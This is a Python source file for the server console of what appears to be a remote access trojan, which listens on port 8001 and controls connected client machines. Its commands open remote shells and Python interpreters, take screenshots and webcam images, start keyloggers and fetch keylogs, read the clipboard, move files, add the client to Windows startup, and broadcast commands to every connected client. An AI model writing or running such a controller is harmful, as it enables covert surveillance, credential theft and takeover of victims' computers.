import os
import threading
import logging
from queue import Empty
from typing import Union

from modules.clients import Client
from server import Server
from utils.errors import errors

INTERFACE_HELP = """help | See this Help Message
shell | Open a shell
python | Open Remote Python Interpreter
screenshot | Grab a screenshot
webcam | Capture webcam
info | User Info
ps | List running processes
kill (pid) | Kill a process by PID
keylogger (start) (stop) (status) | Manage Keylogger
log | Returns log from client (includes keylogs)
send | Transfers file to Client
receive | Transfers file to Server
download | Download file from the web
zip (file) (dir) (unzip) | Zip Files or Folders
copy | Copies to Client Clipboard
paste | Returns Client Current Clipboard
startup (add) (remove) | Manage Startup (Windows)
client (lock) (shutdown) (restart) | Manage Client Machine (Windows)
session (restart) (disconnect) (close) | Manage Client Session
back | Run Connection in Background (or CTRL-C)"""

MENU_HELP = """help | See this Help Message
list | List connected Clients
open (ID) | Connect to a Client
broadcast | Broadcast command to all connected clients
shutdown | Shutdown Server"""


class ServerCLI(Server):
    """ CLI for the server """

    def __init__(self) -> None:
        Server.__init__(self)

        self._print_event = threading.Event()

        self.conn_thread = threading.Thread(target=self.__on_connection)
        self.conn_thread.daemon = True
        self.conn_thread.start()

    def __on_connection(self) -> None:
        """ Print message when a client connects """
        while not self._print_event.is_set():
            try:
                client = self.queue.get(timeout=3)
            except Empty:
                continue
            msg = f'Connection has been established: {client.address[0]} ({client.address[1]})'
            lines = len(msg)*'-'
            print(f'\n{lines}\n{msg}\n{lines}')
            self.queue.task_done()
        self._print_event.clear()

    def close(self) -> None:
        """ Close the CLI and shutdown the server """
        self._print_event.set()
        self.stop()

    def list(self) -> None:
        """ List all connections """
        self.refresh()
        print('----- Clients -----')
        for i, client in enumerate(self.clients):
            print('   '.join(map(str, (i, ) + client.address)))

    def get_target(self, cmd: str) -> Client:
        """ Select target client """
        # returns Client Object
        target = cmd.split(' ')[-1]
        try:
            client = self.clients[int(target)]
        except (ValueError, IndexError):
            logging.error('Not a valid selection')
            return
        print(f"You are now connected to {client.address[2]}")
        return client

    def python_interpreter(self, client: Client) -> None:
        """ Remote Python Interpreter CLI"""
        # returns None
        print('CAUTION! Using this feature wrong can break the client until restarted.')
        print('Tip: help("modules") lists available modules')
        while True:
            command = input('>>> ')
            if command in ['exit', 'exit()']:
                break
            output, error = client.exec(command)
            if error is not None:
                print(error)
                continue
            if output != '':
                print(output, end='')

    def shell(self, client: Client) -> None:
        """ Remote Shell Interface """
        # returns None
        system, home, user = client.get_info()
        hostname = client.address[-1]

        while True:
            cwd = client.get_cwd()
            if not system == 'Windows':
                cwd = cwd.replace(home, '~')
                _input = f'{user}@{hostname}:{cwd}$ '
            else:
                _input = f'{cwd}>'

            command = input(_input)
            if command.strip() == '':
                continue
            if command == 'exit':
                break
            client.shell(command)

    def selector(self, client: Client, command: str) -> Union[bool, None]:
        """ Command selector interface """
        # returns True/None
        commands = command.lower().split(' ')
        command = commands[0]
        select = commands[-1]
        if command == 'help':
            print(INTERFACE_HELP)
        elif command == 'shell':
            try:
                self.shell(client)
            except (EOFError, KeyboardInterrupt):
                print()
        elif command == 'python':
            try:
                self.python_interpreter(client)
            except (EOFError, KeyboardInterrupt):
                print()
        elif command == 'screenshot':
            print('Taking Screenshot...')
            error = client.screenshot()
            if error:
                print(f'Error Taking Screenshot: {error.decode()}')
            else:
                print('Saved Screenshot.')
        elif command == 'webcam':
            print('Accessing webcam...')
            save_as = client.webcam()
            if save_as:
                print('Saved webcam image')
            else:
                print('Webcam Capture Error')
        elif command == 'info':
            client.info()
        elif command == 'ps':
            processes = client.ps()

            # Put process data in a readable format
            data = []

            for process in processes:
                pid = f"{process['pid']}"
                username = process['username']
                cmdline = process['cmdline']
                if cmdline is None or cmdline == '':
                    cmdline = process['name']
                else:
                    cmdline = ' '.join(list(process['cmdline']))

                data.append([pid, username, cmdline])

            print(f'{" "*4}PID {6*" "}User Command')

            terminal_width = int(str(os.get_terminal_size()).split('=')[-2].split(',')[0])

            max_command_length = terminal_width - 19
            if max_command_length < 8:
                max_command_length = 8

            for process in data:
                if len(process[0]) > 7:
                    pid = f' {process[0][:7]}'
                else:
                    pid = f'{(7 - len(process[0])) * " "} {process[0]}'
                if len(process[1]) > 9:
                    username = f' {process[1][:9]} '
                else:
                    username = f'{(9 - len(process[1]))*" "} {process[1]} '
                if len(process[2]) > max_command_length:
                    cmdline = process[2][:max_command_length]
                else:
                    cmdline = f'{process[2]}'
                print(f'{pid}{username}{cmdline}')

        elif command[:4] == 'kill':
            try:
                pid = int(select.strip())
            except (TypeError, ValueError):
                print('Invalid PID')
            else:
                error = client.kill(pid)
                if error:
                    print(error)
                else:
                    print(f'Killed pid {pid}')
        elif command == 'keylogger':
            if select == 'start':
                if client.start_keylogger():
                    print('Started Keylogger')
                else:
                    print('Keylogger ImportError')
            elif select == 'status':
                if client.keylogger_status():
                    print('Keylogger Running')
                else:
                    print('Keylogger is not running.')
            elif select == 'stop':
                if client.stop_keylogger():
                    print('Stopped Keylogger')
                else:
                    print('Keylogger ImportError')
        elif command == 'log':
            print('Transferring log...')
            log = client.get_log()
            print(f'Log saved as: {log}')
        elif command == 'send':
            file_to_transfer = input('File to Transfer to Client: ')
            save_as = input('Save as: ')
            print('Transferring file...')
            error = client.send_file(file_to_transfer, save_as)
            if error:
                print(f'Error transferring file: {error}')
            else:
                print('File transferred.')
        elif command == 'receive':
            file_to_transfer = input('File to Transfer to Server: ')
            save_as = input('Save as: ')
            print('Transferring file...')
            error = client.receive_file(file_to_transfer, save_as)
            if error:
                print(f'Error transferring file: {error}')
            else:
                print('File transferred.')
        elif command == 'download':
            file_url = input('File URL: ')
            file_name = input('Filename: ')
            print('Downloading File...')
            error = client.download(file_url, file_name)
            if error:
                print(error)
            else:
                print('Downloaded file successfully')
        elif command == 'zip':
            if select == 'file':
                save_as = input('Zip Filename: ')
                file_to_zip = input('File to Zip: ')
                error = client.zip_file(save_as, file_to_zip)
                if error:
                    print(error)
                else:
                    print('Zipping Successful.')
            elif select == 'dir':
                save_as = input('Zip Filename: ')
                dir_to_zip = input('Directory to Zip: ')
                error = client.zip_dir(save_as, dir_to_zip)
                if error:
                    print(error)
                else:
                    print('Zipped Directory Successfully.')
            elif select == 'unzip':
                zip_filename = input('Zip File: ')
                error = client.unzip(zip_filename)
                if error:
                    print(error)
                else:
                    print('Unzipped Successfully.')
        elif command == 'copy':
            text_to_copy = input('Text to copy: ')
            error = client.copy(text_to_copy)
            if error:
                print(error)
            else:
                print('Copied to Clipboard.')
        elif command == 'paste':
            _, output = client.paste()
            print(output)
        elif command == 'startup':
            if select == 'add':
                error = client.add_startup()
                if error:
                    print(error)
                else:
                    print('Client added to Startup')
            elif select == 'remove':
                error = client.remove_startup()
                if error:
                    print(error)
                else:
                    print('Removed Client from Startup')
        elif command == 'client':
            if select == 'lock':
                if client.lock():
                    print('Locked Client Machine')
                else:
                    print('Locking is only available on Windows.')
            elif select == 'shutdown':
                result = client.shutdown()
                if result:
                    print('Shutting down Client Machine')
                else:
                    print('Shutdown is only available on Windows.')
                return result
            elif select == 'restart':
                result = client.restart()
                if result:
                    print('Restarting Client Machine')
                else:
                    print('Restart is only available on Windows.')
                return result
        elif command == 'session':
            if select == 'restart':
                print('Restarting Session...')
                client.restart_session()
                self.refresh()
                return True
            elif select == 'disconnect':
                print('Disconnecting Client...')
                server.disconnect(client)
                return True
            elif select == 'close':
                print('Closing Client...')
                client.close()
                server.disconnect(client)
                return True
        elif command == 'back':
            return True
        else:
            print("Invalid command: 'help' for help.")

    def broadcast(self, command: str) -> None:
        """ Broadcast a command to all connected Clients """
        # returns None
        clients = self.clients.copy()
        for client in clients:
            try:
                print(f'Response from {client.address[0]}:')
                self.selector(client, command)
            except Exception as error:
                print(errors(error))

    def interface(self, client: Client) -> None:
        """ CLI to Client """
        # returns None
        ip_address = client.address[0]
        while True:
            command = input(f'{ip_address}> ')
            if self.selector(client, command):
                break

    def menu(self) -> None:
        """ Connection Selector """
        # returns None
        print("Type 'help' for help")
        while True:
            try:
                command = input('> ')
                if command == 'help':
                    print(MENU_HELP)
                elif command == 'broadcast':
                    self.broadcast(input('Command to broadcast: '))
                elif command == 'list':
                    self.list()
                elif command[:4] == 'open':
                    client = self.get_target(command)
                    if client:
                        try:
                            self.interface(client)
                        except (EOFError, KeyboardInterrupt):
                            print()
                        except Exception as error:
                            print(f'Connection lost: {errors(error)}')
                            self.disconnect(client)
                    else:
                        print('Invalid Selection.')
                elif command == 'shutdown':
                    raise EOFError
                else:
                    print("Invalid command: 'help' for help.")
            except (EOFError, KeyboardInterrupt):
                print('\nShutting down Server...')
                self.close()
                break
            except Exception as error:
                print(errors(error))


if __name__ == '__main__':
    server = ServerCLI()
    server.start(('', 8001))
    server.menu()
